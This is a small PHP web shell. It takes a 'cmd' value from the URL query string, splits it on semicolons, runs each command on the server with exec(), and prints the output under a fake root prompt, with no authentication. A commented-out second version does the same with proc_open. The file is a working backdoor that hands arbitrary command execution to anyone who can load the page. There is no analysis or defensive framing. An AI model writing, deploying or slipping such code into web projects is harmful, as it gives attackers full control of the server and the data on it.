<style type="text/css">
.logLine {
  font-family: Monospace;
  font-size: 12px;
}
</style>

<div style="margin:10;padding:0">
<?PHP

$command = urldecode(($_GET['cmd']));
foreach (explode(';', $command) as $cmd){
	$output = array();
	echo '<fieldset style="margin-top:1px;" class="CMD"><legend/>Command:</legend>';
	echo "root@localhost:# {$cmd}<br>";
	exec($cmd . ' 2>&1', $output, $retval);
	$last200 = array_slice($output, -200, 200, true);
	echo "<p class=\"logLine\">";
	foreach($last200 as $line){echo "{$line}<br>"; }
	echo "</p>";
	echo $retval ?  "The command failed." : "The command finished successfully!";
	echo "</fieldset><br><br>";
}

?>

<?/*
<style type="text/css">
.logLine {
  font-family: Monospace;
  font-size: 12px;
}
</style>
<div style="margin:10;padding:0">

<?PHP
$cmd = trim($_GET['cmd']);
echo "Command: {$cmd}";
echo "<p class=\"logLine\">";
$descriptorspec = array(
   0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
   2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);
flush();
$process = proc_open($cmd." 2>&1", $descriptorspec, $pipes, realpath(''), array());
if (is_resource($process)) {
    while ($s = fgets($pipes[1])) {
        echo htmlentities($s)."<br>";
        $so = htmlentities(fgets($pipes[2]));
        echo strlen($so) ? $so."<br>" : "";
        flush();
    }
}
$return_value = proc_close($process);
echo "</p>";
echo $return_value ?  "The command failed." : "The command finished successfully!";
?>

</div>
*/?>